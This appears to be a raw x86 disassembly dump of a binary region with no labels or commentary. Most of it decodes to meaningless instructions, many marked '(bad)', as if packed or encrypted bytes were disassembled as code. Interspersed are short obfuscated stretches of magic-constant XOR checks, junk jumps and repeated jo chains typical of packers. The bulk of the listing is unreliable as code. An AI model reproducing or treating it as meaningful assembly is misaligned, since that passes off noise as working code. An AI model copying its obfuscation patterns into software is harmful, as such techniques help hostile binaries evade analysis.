  4020af:	ficom  DWORD PTR [edx]
  4020b1:	test   BYTE PTR [ecx-0x53f68532],al
  4020b7:	mov    dl,dh
  4020b9:	out    dx,eax
  4020ba:	retf   
  4020bb:	mov    fs,WORD PTR [edx+ecx*8]
  4020be:	test   BYTE PTR [edx-0x5a],0x9b
  4020c2:	dec    esi
  4020c3:	rol    ebp,0xd2
  4020c6:	fisub  DWORD PTR [esi]
  4020c8:	hlt    
  4020c9:	cmc    
  4020ca:	pusha  
  4020cb:	xor    eax,0x533d2d4d
  4020d0:	cmp    eax,0xffdc3ee6
  4020d5:	pop    eax
  4020d6:	add    BYTE PTR [edi],dl
  4020d8:	jbe    0x402144
  4020da:	xchg   bl,ch
  4020dc:	xor    al,0xd1
  4020de:	push   ebp
  4020df:	adc    eax,DWORD PTR [ebx+0x5f]
  4020e2:	loop   0x4020a9
  4020e4:	les    edx,FWORD PTR [ecx+0x102a682a]
  4020ea:	adc    al,0xb5
  4020ec:	lods   al,BYTE PTR ds:[esi]
  4020ed:	adc    eax,0x49215435
  4020f2:	sbb    edi,edi
  4020f4:	and    eax,0x3d4d0b86
  4020f9:	call   0xb9a2:0xbd582a4c
  402100:	hlt    
  402101:	out    0x7d,al
  402103:	fsin   
  402105:	shr    DWORD PTR [ebx],1
  402107:	xchg   ecx,eax
  402108:	inc    ebx
  402109:	jb     0x40211c
  40210b:	dec    edx
  40210c:	adc    al,0x68
  40210e:	mov    eax,ds:0xbb9a15f1
  402113:	stc    
  402114:	sbb    esp,DWORD PTR [edi+esi*2]
  402117:	push   esi
  402118:	jns    0x4020d3
  40211a:	add    DWORD PTR [esi-0x57],edx
  40211d:	loop   0x4020e5
  40211f:	xchg   BYTE PTR [eax],bh
  402121:	or     cl,BYTE PTR [esp+ecx*2-0x36a95fb3]
  402128:	repz and eax,ebx
  40212b:	(bad)  
  40212c:	adc    BYTE PTR [ebp+0x7e],ah
  40212f:	add    dh,ah
  402131:	pop    edi
  402132:	imul   edx,esi,0x2174f7fe
  402138:	lock in al,0x1f
  40213b:	shl    DWORD PTR [ebp-0x7c],cl
  40213e:	fs mov ebx,edi
  402141:	enter  0xe06c,0xc5
  402145:	and    al,0x44
  402147:	jb     0x4021b6
  402149:	jnp    0x40210c
  40214b:	stos   BYTE PTR es:[edi],al
  40214c:	sub    eax,0x6d928bbc
  402151:	int3   
  402152:	outs   dx,DWORD PTR ds:[esi]
  402153:	xor    al,0x4c
  402155:	xchg   edi,eax
  402156:	push   esi
  402157:	call   0xb5b4:0xb1fc2dfd
  40215e:	(bad)  
  40215f:	pop    ebp
  402160:	xchg   esp,eax
  402161:	dec    esi
  402162:	pop    ebp
  402163:	xchg   ebx,eax
  402164:	pop    eax
  402165:	cli    
  402166:	pop    esi
  402167:	adc    BYTE PTR [eax+0x2e03d2b4],ch
  40216d:	cmp    al,0x26
  40216f:	sub    bl,ah
  402171:	pop    edi
  402172:	pop    ebp
  402173:	pop    edx
  402174:	add    al,0xeb
  402176:	loope  0x4021ca
  402178:	inc    eax
  402179:	call   0xb8bd8017
  40217e:	nop
  40217f:	dec    ebp
  402180:	push   eax
  402181:	aaa    
  402182:	push   eax
  402183:	dec    eax
  402184:	(bad)  [ebp-0x65ad6355]
  40218a:	adc    al,0x8d
  40218c:	xchg   esp,eax
  40218d:	or     ebp,DWORD PTR [ecx+0x4bee1d8]
  402193:	pop    ebp
  402194:	out    dx,al
  402195:	(bad)  
  402197:	inc    ebp
  402198:	xor    eax,0x4c19d82f
  40219d:	mov    esp,0xa4b6969e
  4021a2:	mov    bh,0x13
  4021a4:	pushf  
  4021a5:	fidivr DWORD PTR [eax*1-0x1611b240]
  4021ac:	push   ebx
  4021ad:	mov    ds:0x29f23557,al
  4021b2:	push   edi
  4021b3:	or     eax,0x47b2e1ac
  4021b8:	add    eax,0xcddc44c7
  4021bd:	push   ss
  4021be:	ss mov al,bl
  4021c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021c3:	jo     0x4021ce
  4021c5:	sbb    ecx,edi
  4021c7:	bound  esp,QWORD PTR [ebp+edx*4+0x17]
  4021cb:	rcr    DWORD PTR [eax],1
  4021cd:	int    0x97
  4021cf:	call   0x651fea0f
  4021d4:	mov    BYTE PTR [eax+0x62],0x6d
  4021d8:	repnz sti 
  4021da:	pop    edx
  4021db:	cmp    DWORD PTR [eax+0x22],ecx
  4021de:	shl    BYTE PTR [esi+0x6a286b],1
  4021e4:	in     eax,0x36
  4021e6:	mov    esp,?
  4021e8:	jae    0x40218d
  4021ea:	sbb    al,0x97
  4021ec:	outs   dx,DWORD PTR ds:[esi]
  4021ed:	add    al,0x6a
  4021ef:	dec    eax
  4021f0:	cwde   
  4021f1:	xor    eax,0xaa67d5f2
  4021f6:	mov    bl,0x54
  4021f8:	mov    ds:0x7caaeb29,al
  4021fd:	loope  0x4021fb
  4021ff:	add    al,0xae
  402201:	sub    BYTE PTR [esi+eiz*1],0x61
  402205:	pop    eax
  402206:	xchg   esp,eax
  402207:	test   al,0x77
  402209:	xor    DWORD PTR [eax-0x33],eax
  40220c:	jp     0x402267
  40220e:	add    al,0x20
  402210:	call   0xf182d2fd
  402215:	psubsw mm1,QWORD PTR [edx+ebp*1-0x18]
  40221a:	xchg   ecx,eax
  40221b:	dec    BYTE PTR [edx+0x58]
  40221e:	rol    BYTE PTR [edx+0x44],0xd5
  402222:	pop    esi
  402223:	adc    DWORD PTR [eax],ecx
  402225:	add    al,0xfb
  402227:	sub    eax,0x5a941618
  40222c:	retf   0xf7ef
  40222f:	push   cs
  402230:	push   edi
  402231:	push   0xfffffff5
  402233:	call   0x4c5b:0x645f818
  40223a:	xchg   ebx,eax
  40223b:	mov    cl,dh
  40223d:	push   ds
  40223e:	inc    ecx
  40223f:	rcl    BYTE PTR [edi-0x21],0xcb
  402243:	lea    edi,[eax]
  402245:	add    esi,esp
  402247:	(bad)  
  402248:	in     eax,dx
  402249:	rcr    DWORD PTR [eax],cl
  40224b:	arpl   WORD PTR [ebx+0x2da72530],bx
  402251:	neg    DWORD PTR [edi+edx*8-0x35067c2f]
  402258:	test   al,0xb3
  40225a:	das    
  40225b:	or     eax,0xe3eed7fe
  402260:	jbe    0x4022cd
  402262:	mov    bl,0x74
  402264:	sbb    eax,0x2d228389
  402269:	xor    bh,BYTE PTR [esi-0x46]
  40226c:	and    al,0x6f
  40226e:	cmp    al,0x9b
  402270:	into   
  402271:	or     esi,DWORD PTR [esi]
  402273:	cmp    esi,0x81840f3f
  402279:	add    al,0x0
  40227b:	add    BYTE PTR [ebx-0x3ecc13bb],cl
  402281:	add    eax,esi
  402283:	mov    DWORD PTR [ebp-0x30],eax
  402286:	mov    eax,DWORD PTR [ebp-0x34]
  402289:	jmp    0x4024a6
  40228e:	jp     0x40222b
  402290:	sbb    al,0xe8
  402292:	cdq    
  402293:	ja     0x402267
  402295:	jno    0x40227a
  402297:	sbb    al,0x20
  402299:	sub    esi,ebp
  40229b:	fstp   DWORD PTR [ebp-0x2d]
  40229e:	jo     0x4022a2
  4022a0:	jo     0x402312
  4022a2:	jo     0x402322
  4022a4:	jo     0x402316
  4022a6:	(bad)  
  4022a7:	in     al,0x59
  4022a9:	sub    ch,ch
  4022ab:	popf   
  4022ac:	aad    0x36
  4022ae:	(bad)  
  4022af:	or     ch,BYTE PTR [edi-0x6191a25e]
  4022b5:	cwde   
  4022b6:	sub    DWORD PTR [edx],esp
  4022b8:	not    DWORD PTR [ecx]
  4022ba:	pusha  
  4022bb:	xor    DWORD PTR [ebx-0x47e87b72],ecx
  4022c1:	cmp    BYTE PTR [ebp-0x18],ah
  4022c4:	jge    0x4022a3
  4022c6:	push   ss
  4022c7:	es push edi
  4022c9:	pop    ebx
  4022ca:	mov    ds:0xa27e4e54,eax
  4022cf:	(bad)  
  4022d0:	jecxz  0x402295
  4022d2:	in     eax,dx
  4022d3:	cs adc al,cl
  4022d6:	jg     0x4022cd
  4022d8:	std    
  4022d9:	mov    ebp,0x7d7f1c25
  4022de:	sbb    bh,BYTE PTR [ebp+0x29]
  4022e1:	repnz xchg edi,eax
  4022e3:	mov    ds:0x85286ae3,al
  4022e8:	jo     0x402360
  4022ea:	aam    0x7d
  4022ec:	mov    edx,0x64fdb02f
  4022f1:	jp     0x40235c
  4022f3:	add    bl,BYTE PTR [ebx+edi*2]
  4022f6:	and    al,0x19
  4022f8:	sub    BYTE PTR [ecx+0x4f],bh
  4022fb:	jp     0x4022be
  4022fd:	mov    esi,0xe70336a1
  402302:	ds cmp dh,ah
  402305:	add    al,BYTE PTR [ebp-0x15]
  402308:	inc    ebx
  402309:	jae    0x402346
  40230b:	(bad)  
  40230c:	cmp    DWORD PTR [ebp+edx*8+0x3d38c90f],0xaf9c1129
  402317:	mov    ds:0x327bc39f,eax
  40231c:	sbb    al,0xd7
  40231e:	mov    eax,ds:0x22648cf8
  402323:	call   0xba01:0x212f770a
  40232a:	or     DWORD PTR [ebx],esp
  40232c:	xchg   BYTE PTR [ebx-0x14],dl
  40232f:	addr16 cld 
  402331:	lahf   
  402332:	aas    
  402333:	mov    edi,0xcfdecad0
  402338:	ficom  WORD PTR [edi+0x7e1c4461]
  40233e:	add    DWORD PTR [ebp-0x4e2a0480],eax
  402344:	xchg   esp,ecx
  402346:	ins    DWORD PTR es:[edi],dx
  402347:	adc    al,0x1
  402349:	je     0x40230c
  40234b:	shl    DWORD PTR cs:[edi],1
  40234e:	push   ebx
  40234f:	push   ss
  402350:	test   DWORD PTR [edi+0x65f14920],ecx
  402356:	pop    es
  402357:	pusha  
  402358:	pop    eax
  402359:	dec    edx
  40235a:	cmp    dh,BYTE PTR [edi-0x38]
  40235d:	fmul   DWORD PTR [eax]
  40235f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402360:	int    0x57
  402362:	xchg   ebp,eax
  402363:	sbb    eax,0x196e516b
  402368:	mov    dl,0xb7
  40236a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40236b:	iret   
  40236c:	push   ss
  40236d:	(bad)  
  40236e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40236f:	shl    DWORD PTR [ebp-0x62a30288],1
  402375:	sbb    ch,cl
  402377:	pusha  
  402378:	leave  
  402379:	jge    0x402353
  40237b:	test   DWORD PTR [ebp+0x4676e2cc],ebx
  402381:	jo     0x40231d
  402383:	bound  edi,QWORD PTR [ebx-0x7f]
  402386:	out    dx,al
  402387:	jge    0x4023c6
  402389:	addr16 in eax,dx
  40238b:	in     eax,dx
  40238c:	jge    0x40237f
  40238e:	inc    ecx
  40238f:	pop    ebp
  402390:	xor    ebx,DWORD PTR ds:0x200aba3
  402396:	sbb    ebx,ebx
  402398:	cwde   
  402399:	sub    al,0x17
  40239b:	mov    ecx,0x29a3ce38
  4023a0:	(bad)  
  4023a1:	cmc    
  4023a2:	cmp    edi,DWORD PTR [edi]
  4023a4:	add    esi,ebx
  4023a6:	fld    QWORD PTR [edx]
  4023a8:	pop    edi
  4023a9:	rcl    ch,1
  4023ab:	sahf   
  4023ac:	(bad)
  4023b0:	mov    edi,DWORD PTR [ebx+0x11]
  4023b3:	push   edi
  4023b4:	scas   al,BYTE PTR es:[edi]
  4023b5:	or     al,0x5c
  4023b7:	sahf   
  4023b8:	mov    eax,ds:0x7da941d9
  4023bd:	jb     0x40237f
  4023bf:	dec    esi
  4023c0:	pushf  
  4023c1:	and    ebx,esi
  4023c3:	mov    eax,ds:0x44aa8704
  4023c8:	rol    DWORD PTR [edx],cl
  4023ca:	pop    edi
  4023cb:	jnp    0x402390
  4023cd:	stos   BYTE PTR es:[edi],al
  4023ce:	cmp    cl,bl
  4023d0:	test   al,0x81
  4023d2:	xchg   ebp,eax
  4023d3:	ror    BYTE PTR [edx+eiz*8],0xec
  4023d7:	scas   al,BYTE PTR es:[edi]
  4023d8:	mov    cl,BYTE PTR [esi+0xdcf64e2]
  4023de:	mov    dh,0x1b
  4023e0:	hlt    
  4023e1:	mov    WORD PTR [edx],?
  4023e3:	xchg   edi,eax
  4023e4:	pop    ecx
  4023e5:	test   DWORD PTR [ebx-0x3de07402],ebp
  4023eb:	das    
  4023ec:	jno    0x402415
  4023ee:	mov    edx,0x577fd6e4
  4023f3:	dec    ebp
  4023f4:	jg     0x402472
  4023f6:	(bad)  [ebx-0x12]
  4023f9:	jmp    0x402443
  4023fb:	cwde   
  4023fc:	mov    edi,0xa82eb60d
  402401:	lds    ebx,FWORD PTR [edx]
  402403:	gs addr16 mov edx,fs
  402407:	icebp  
  402408:	js     0x402392
  40240a:	jle    0x402463
  40240c:	push   0x33
  40240e:	in     eax,dx
  40240f:	ror    BYTE PTR [eax+0xa],cl
  402412:	pop    ebp
  402413:	pop    ebx
  402414:	mov    bl,0x5b
  402416:	pop    ebp
  402417:	push   esp
  402418:	ds das 
  40241a:	mov    dh,0xbf
  40241c:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40241e:	aad    0xc5
  402420:	(bad)  
  402421:	aam    0x8c
  402423:	addr16 iret 
  402425:	cmp    bl,BYTE PTR [edx]
  402427:	test   eax,0xebfcdacd
  40242c:	pop    ecx
  40242d:	adc    BYTE PTR [esi],0xc0
  402430:	mov    esi,0xc070401c
  402435:	lods   eax,DWORD PTR ds:[esi]
  402436:	jae    0x4023f9
  402438:	fiadd  DWORD PTR [esi-0x2b]
  40243b:	data16 (bad) 
  40243d:	aas    
  40243e:	jp     0x4024bd
  402440:	outs   dx,DWORD PTR ds:[esi]
  402441:	aam    0x19
  402443:	in     eax,0xdc
  402445:	jecxz  0x402421
  402447:	and    eax,0x35d25da6
  40244c:	jmp    0xccb5:0x89c4c095
  402453:	pop    es
  402454:	sub    BYTE PTR [ebp+0x724fef98],cl
  40245a:	mov    edi,0xc303a1bf
  40245f:	ins    BYTE PTR es:[edi],dx
  402460:	push   cs
  402461:	ds mov ch,0x42
  402464:	cmp    al,0x9f
  402466:	lahf   
  402467:	cmp    bh,BYTE PTR [eax]
  402469:	mov    edx,0xae7a79c8
  40246e:	xor    dl,BYTE PTR [ebp+0x48]
  402471:	inc    ecx
  402472:	int    0x1f
  402474:	xor    edx,DWORD PTR [eax]
  402476:	sbb    eax,0xdd98f6fc
  40247b:	dec    edx
  40247c:	(bad)  
  40247e:	mov    al,0x4a
  402480:	aaa    
  402481:	sub    al,0x24
  402483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402484:	fcomi  st,st(2)
  402486:	jbe    0x40243f
  402488:	pop    ds
  402489:	sbb    ebx,esi
  40248b:	push   0x7af47389
  402490:	dec    ecx
  402491:	or     dl,ah
  402493:	outs   dx,DWORD PTR ds:[esi]
  402494:	inc    edi
  402495:	ret    
  402496:	shr    BYTE PTR [edi-0x2d],0x6f
  40249a:	sbb    al,0xc7
  40249c:	and    DWORD PTR [ecx+0x3ed01d87],ebp
  4024a2:	push   eax
  4024a3:	and    DWORD PTR [eax],0x558b661b
  4024a9:	enter  0x3ebb,0x8a
  4024ad:	add    BYTE PTR [eax],al
  4024af:	xor    dx,bx
  4024b2:	mov    ebx,DWORD PTR [ebp-0x8]
  4024b5:	add    dx,di
  4024b8:	movzx  edx,dx
  4024bb:	xor    ebx,ecx
  4024bd:	lea    edx,[edx+ebx*1+0x32729c]
  4024c4:	add    DWORD PTR [eax],edx
  4024c6:	mov    eax,DWORD PTR [ebp-0x2c]
  4024c9:	mov    edx,DWORD PTR [ebp-0x8]
  4024cc:	mov    ebx,DWORD PTR [ebp-0x30]
  4024cf:	xor    edx,ecx
  4024d1:	add    edx,esi
  4024d3:	imul   edx,ebx
  4024d6:	sub    DWORD PTR [eax],edx
  4024d8:	mov    eax,DWORD PTR [ebp-0x14]
  4024db:	jmp    0x402730
  4024e0:	jmp    0x4026fd
  4024e5:	and    DWORD PTR [edi+edi*4+0x31714d76],esi
  4024ec:	jae    0x40250e
  4024ee:	xor    BYTE PTR [ecx+0x3bea6637],cl
  4024f4:	repz jo 0x4024f7
  4024f7:	jo     0x402569
  4024f9:	jo     0x402579
  4024fb:	jo     0x40256d
  4024fd:	jns    0x402575
  4024ff:	ja     0x4024bf
  402501:	cwde   
  402502:	add    DWORD PTR [edx],eax
  402504:	aam    0xb3
  402506:	loope  0x402560
  402508:	cmp    cl,ch
  40250a:	mov    ds:0x158c45aa,al
  40250f:	fnstcw WORD PTR [esp-0x77d98e67]
  402516:	mov    cs,WORD PTR [ecx+0x62]
  402519:	or     BYTE PTR [esi+eax*2-0x19b5afd9],cl
  402520:	and    esp,DWORD PTR [edx]
  402522:	jmp    0x40253d
  402524:	ret    
  402525:	xchg   dl,dl
  402527:	inc    ebx
  402528:	pop    ebp
  402529:	xchg   ebp,eax
  40252a:	pop    es
  40252b:	stos   DWORD PTR es:[edi],eax
  40252c:	mov    edi,0xf29f29e0
  402531:	dec    ebp
  402532:	sbb    eax,0x7963b452
  402537:	dec    ebp
  402538:	int3   
  402539:	mov    esp,0x7617739a
  40253e:	mov    bl,BYTE PTR [edi]
  402540:	pop    ecx
  402541:	ins    DWORD PTR es:[edi],dx
  402542:	(bad)  
  402543:	mov    ah,0x26
  402545:	jae    0x4024e7
  402547:	or     al,0xe6
  402549:	pop    ecx
  40254a:	jbe    0x4024d6
  40254c:	je     0x4025be
  40254e:	int    0x13
  402550:	dec    esp
  402551:	loopne 0x40253a
  402553:	hlt    
  402554:	sub    dl,al
  402556:	aaa    
  402557:	das    
  402558:	je     0x40251e
  40255a:	es test al,0x76
  40255d:	out    0xae,al
  40255f:	ror    BYTE PTR [edi],1
  402561:	push   ss
  402562:	mov    ds:0x7f4cb82d,eax
  402567:	ret    
  402568:	inc    ecx
  402569:	mov    ds:0xfa9c1a79,al
  40256e:	(bad)  
  40256f:	sbb    al,0x98
  402571:	lahf   
  402572:	pop    ss
  402573:	push   cs
  402574:	rol    cl,0x80
  402577:	xchg   ecx,eax
  402578:	fs pop edx
  40257a:	adc    BYTE PTR [ebx+0x37],al
  40257d:	push   ss
  40257e:	mov    dl,0xa0
  402580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402581:	scas   eax,DWORD PTR es:[edi]
  402582:	(bad)  
  402583:	popf   
  402584:	inc    ecx
  402585:	lods   eax,DWORD PTR ds:[esi]
  402586:	fcomp  QWORD PTR [ebp+0x5a]
  402589:	popa   
  40258a:	push   ecx
  40258b:	lea    eax,[eax+eiz*1-0x7d]
  40258f:	cli    
  402590:	jl     0x402530
  402592:	ret    0x829
  402595:	sub    DWORD PTR [ebx],eax
  402597:	div    BYTE PTR [esi+0x612461c3]
  40259d:	call   0xc70d:0x91b1d186
  4025a4:	add    cl,BYTE PTR [edi+0x15]
  4025a7:	and    BYTE PTR [eax-0x1ef5321e],al
  4025ad:	cmp    ebp,DWORD PTR [eax+esi*4-0x3]
  4025b1:	and    eax,0x38811452
  4025b6:	xchg   ebx,eax
  4025b7:	(bad)  
  4025b8:	xchg   edx,eax
  4025b9:	pop    esi
  4025ba:	inc    edi
  4025bb:	ins    BYTE PTR es:[edi],dx
  4025bc:	push   ss
  4025bd:	cmc    
  4025be:	cld    
  4025bf:	jae    0x402628
  4025c1:	arpl   WORD PTR [edx+0x77],cx
  4025c4:	pop    esi
  4025c5:	je     0x40263d
  4025c7:	in     al,0x29
  4025c9:	stos   BYTE PTR es:[edi],al
  4025ca:	scas   eax,DWORD PTR es:[edi]
  4025cb:	sbb    DWORD PTR [ebp+ecx*1+0xea4a4f],edx
  4025d2:	out    0x51,al
  4025d4:	push   cs
  4025d5:	or     eax,0x2fa32003
  4025da:	mov    eax,0x1072a673
  4025df:	repz sub dh,al
  4025e2:	out    0xab,eax
  4025e4:	sbb    bh,BYTE PTR [eax+0xf]
  4025e7:	push   edi
  4025e8:	sub    eax,DWORD PTR [ebp+0x1f]
  4025eb:	retf   0x9488
  4025ee:	dec    esi
  4025ef:	aad    0x85
  4025f1:	jns    0x4025f7
  4025f3:	in     eax,0xb7
  4025f5:	jl     0x4025b2
  4025f7:	gs repz (bad) 
  4025fa:	fld    DWORD PTR [eax]
  4025fc:	cmp    eax,0x50109e9f
  402601:	movlps xmm5,QWORD PTR [ecx+0x2fc699e7]
  402608:	jbe    0x402651
  40260a:	push   0x581fc135
  40260f:	popf   
  402610:	sbb    al,0xec
  402612:	lods   eax,DWORD PTR ds:[esi]
  402613:	scas   al,BYTE PTR es:[edi]
  402614:	repz jg 0x402613
  402617:	jne    0x402667
  402619:	leave  
  40261a:	inc    esi
  40261b:	cmp    eax,ebp
  40261d:	xchg   ecx,eax
  40261e:	daa    
  40261f:	dec    edx
  402620:	les    edi,FWORD PTR [edi-0x4f654683]
  402626:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402627:	scas   eax,DWORD PTR es:[edi]
  402628:	dec    ebx
  402629:	neg    BYTE PTR [edx+0x5e6928ac]
  40262f:	std    
  402630:	shr    DWORD PTR [esi+eax*4+0x37af53cd],cl
  402637:	out    0x46,eax
  402639:	add    eax,0xc6aea904
  40263e:	cmc    
  40263f:	fwait
  402640:	shl    DWORD PTR fs:[ebx],1
  402643:	jo     0x402608
  402645:	mov    ebx,0xe178e597
  40264a:	jle    0x40269d
  40264c:	jp     0x4025f8
  40264e:	or     DWORD PTR [ebx],edi
  402650:	adc    DWORD PTR [edi+0x0],edx
  402653:	dec    ebp
  402654:	jb     0x402658
  402656:	clc    
  402657:	jecxz  0x4026bd
  402659:	xchg   DWORD PTR [ebx-0xcb9c615],eax
  40265f:	add    DWORD PTR [esi+0x71],esp
  402662:	frstor [ecx]
  402664:	sub    esp,DWORD PTR [ecx-0x34233d7]
  40266a:	push   0xa08d9706
  40266f:	push   eax
  402670:	jno    0x40261f
  402672:	pop    ebp
  402673:	(bad)  
  402674:	mov    eax,0x8f50e8b9
  402679:	sbb    cl,BYTE PTR [ebp+0x14afc693]
  40267f:	fimul  WORD PTR [ecx-0x46]
  402682:	lea    ebp,[ebx]
  402684:	and    eax,0x962bfc
  402689:	pop    edi
  40268a:	fisub  WORD PTR [ebx]
  40268c:	pop    ss
  40268d:	xlat   BYTE PTR ds:[ebx]
  40268e:	mov    al,0x62
  402690:	sbb    ecx,DWORD PTR ds:0x32e22aac
  402696:	pop    ds
  402697:	int3   
  402698:	arpl   WORD PTR [esp+edx*8-0x7d],ax
  40269c:	in     al,dx
  40269d:	xor    edx,DWORD PTR fs:[ecx-0x67]
  4026a1:	inc    edx
  4026a2:	pop    ss
  4026a3:	sar    DWORD PTR [ebx],0x6c
  4026a6:	fdiv   QWORD PTR [edx]
  4026a8:	xchg   ecx,eax
  4026a9:	push   eax
  4026aa:	dec    ebp
  4026ab:	pop    ebp
  4026ac:	sahf   
  4026ad:	mov    ds,WORD PTR ss:[esi-0x119a321]
  4026b4:	lds    ecx,FWORD PTR [ecx]
  4026b6:	es in  eax,dx
  4026b8:	pop    ss
  4026b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026ba:	out    dx,eax
  4026bb:	gs mov edx,0xd7849197
  4026c1:	push   ecx
  4026c2:	sar    ecx,0x9
  4026c5:	jl     0x402734
  4026c7:	pushf  
  4026c8:	jnp    0x402720
  4026ca:	mov    al,BYTE PTR [eax+0x32]
  4026cd:	push   es
  4026ce:	jp     0x402711
  4026d0:	sub    dh,bl
  4026d2:	cli    
  4026d3:	pop    ebx
  4026d4:	(bad)  
  4026d5:	iret   
  4026d6:	xchg   edx,eax
  4026d7:	push   edx
  4026d8:	stos   BYTE PTR es:[edi],al
  4026d9:	popa   
  4026da:	cs pop ds
  4026dc:	mov    ?,WORD PTR [esi]
  4026de:	cmp    DWORD PTR [eax+0x112b0ce6],ecx
  4026e4:	shl    BYTE PTR [ecx+edi*1],0xcf
  4026e8:	mov    eax,ds:0xa1e47bf2
  4026ed:	stc    
  4026ee:	pop    edi
  4026ef:	inc    edx
  4026f0:	(bad)  
  4026f1:	xor    bl,BYTE PTR [ebx+0x2422c8c5]
  4026f7:	xor    ebp,DWORD PTR [ebx+0x5c945b79]
  4026fd:	mov    eax,DWORD PTR [ebp-0xc]
  402700:	mov    edx,DWORD PTR [ebp-0x18]
  402703:	xor    eax,edx
  402705:	cmp    eax,0x8cb40b7d
  40270a:	je     0x40272d
  402710:	mov    eax,DWORD PTR [ebp-0x10]
  402713:	add    DWORD PTR [eax],0x7403501
  402719:	jmp    0x40272d
  40271e:	mov    eax,DWORD PTR [ebp-0x1c]
  402721:	cmp    DWORD PTR [eax],0xf89f2da9
  402727:	jne    0x402748
  40272d:	mov    eax,DWORD PTR [ebp-0x8]
  402730:	xor    eax,ecx
  402732:	add    eax,esi
  402734:	test   eax,eax
  402736:	jne    0x402748
  40273c:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  402743:	jmp    0x4012bf
  402748:	pop    ebx
  402749:	pop    edi
  40274a:	jmp    0x402967
  40274f:	cs dec edi
  402751:	add    dl,bl
  402753:	popa   
  402754:	push   ecx
  402755:	in     eax,dx
  402756:	jno    0x4026ea
  402758:	imul   ebx,DWORD PTR [ecx+esi*8],0x2e11334e
  40275f:	jo     0x40276f
  402761:	jo     0x4027d3
  402763:	jo     0x4027e3
  402765:	jo     0x4027d7
  402767:	aaa    
  402768:	fs pop ebp
  40276a:	lahf   
  40276b:	jg     0x40276c
  40276d:	test   DWORD PTR [ecx+0x145bd165],ebx
  402773:	leave  
  402774:	sub    ecx,DWORD PTR [esi-0x5e]
  402777:	(bad)  
  402778:	mov    dh,0x2c
  40277a:	dec    BYTE PTR [edx]
  40277c:	dec    ebx
  40277d:	dec    ebx
  40277e:	(bad)  
  40277f:	cld    
  402780:	jmp    0x5d3a3ace
  402785:	cmp    DWORD PTR [edx+edx*4],ebp
  402788:	inc    esp
  402789:	in     al,0xea
  40278b:	xor    DWORD PTR [edi+0xd65c997],ebx
  402791:	or     cl,BYTE PTR [ecx]
  402793:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402794:	not    BYTE PTR [ecx-0x74]
  402797:	sti    
  402798:	mov    WORD PTR [edx],?
  40279a:	jp     0x4027e0
  40279c:	mov    ecx,0xf7427d8c
  4027a1:	xchg   ebp,eax
  4027a2:	jmp    0x402756
  4027a4:	iret   
  4027a5:	dec    esp
  4027a6:	and    DWORD PTR [ecx-0x417973],edx
  4027ac:	pop    ss
  4027ad:	das    
  4027ae:	push   cs
  4027af:	mov    WORD PTR [edi],?
  4027b1:	test   eax,0x9e723805
  4027b6:	jae    0x40273d
  4027b8:	sar    DWORD PTR [edx*8+0x6a2fb724],1
  4027bf:	mov    bl,0xdf
  4027c1:	fwait
  4027c2:	sub    dl,cl
  4027c4:	sub    edi,DWORD PTR [ecx]
  4027c6:	repz (bad) 
  4027c8:	pop    edx
  4027c9:	test   dl,bh
  4027cb:	xor    DWORD PTR [eax],0xffffffa4
  4027ce:	pop    edi
  4027cf:	call   0x895d3504
  4027d4:	pop    ecx
  4027d5:	rcl    DWORD PTR [ebx+eax*2-0x14],cl
  4027d9:	(bad)  
  4027da:	sbb    eax,0xc426d0e1
  4027df:	iret   
  4027e0:	cmp    edi,ebx
  4027e2:	mov    dh,0x16
  4027e4:	push   edi
  4027e5:	mov    ecx,0xf62de606
  4027ea:	xchg   edi,eax
  4027eb:	std    
  4027ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027ed:	icebp  
  4027ee:	xor    ah,BYTE PTR [ebx-0x11]
  4027f1:	int    0x4c
  4027f3:	ret    
  4027f4:	mov    cl,0x3d
  4027f6:	pop    ebp
  4027f7:	inc    edi
  4027f8:	jmp    0x402804
  4027fa:	xchg   ecx,esp
  4027fc:	ret    
  4027fd:	jb     0x402864
  4027ff:	aas    
  402800:	cmp    al,0xc8
  402802:	std    
  402803:	sub    al,0xf6
  402805:	addr16 jle 0x40280f
  402808:	test   BYTE PTR [eax-0x6e],ch
  40280b:	cmp    edx,DWORD PTR [esi-0x2d6c6676]
  402811:	shr    DWORD PTR [esi],0xc8
  402814:	stos   BYTE PTR es:[edi],al
  402815:	or     ecx,ebx
  402817:	push   cs
  402818:	loope  0x40282c
  40281a:	add    DWORD PTR [edi-0x36fb8125],0xfffffff6
  402821:	clc    
  402822:	fild   DWORD PTR [ebx+ebp*8-0x35d99a8c]
  402829:	mov    WORD PTR [esi+0x4b],?
  40282c:	dec    bh
  40282e:	push   ebx
  40282f:	mov    eax,ds:0x41a4f89a
  402834:	xchg   DWORD PTR [esi-0x30004407],esi
  40283a:	inc    esi
  40283b:	mov    al,ds:0xb84be90a
  402840:	cli    
  402841:	gs into 
  402843:	mov    eax,0x7d1610c9
  402848:	(bad)  
  402849:	iret   
  40284a:	or     al,0xbb
  40284c:	dec    ebp
  40284d:	push   esp
  40284e:	shl    DWORD PTR es:[ebx+0x78],cl
  402852:	daa    
  402853:	jle    0x402862
  402855:	sahf   
  402856:	sti    
  402857:	jbe    0x4027ea
  402859:	sbb    esi,DWORD PTR [esi]
  40285b:	pop    ebp
  40285c:	push   ebp
  40285d:	mov    BYTE PTR [ecx],0x99
  402860:	sar    BYTE PTR [ebx-0x16],1
  402863:	stc    
  402864:	(bad)  
  402865:	out    dx,eax
  402866:	mov    esi,0x26e7712f
  40286b:	aaa    
  40286c:	rcl    BYTE PTR [eax+eax*8-0x26],cl
  402870:	cli    
  402871:	aam    0xb1
  402873:	and    cl,BYTE PTR [edx-0x32b32b1e]
  402879:	call   0x73805a2e
  40287e:	sub    al,0xe4
  402880:	fistp  QWORD PTR [ebx-0x208caada]
  402886:	mov    edx,0x133bb8e3
  40288b:	jno    0x38609392
  402891:	(bad)  
  402892:	hlt    
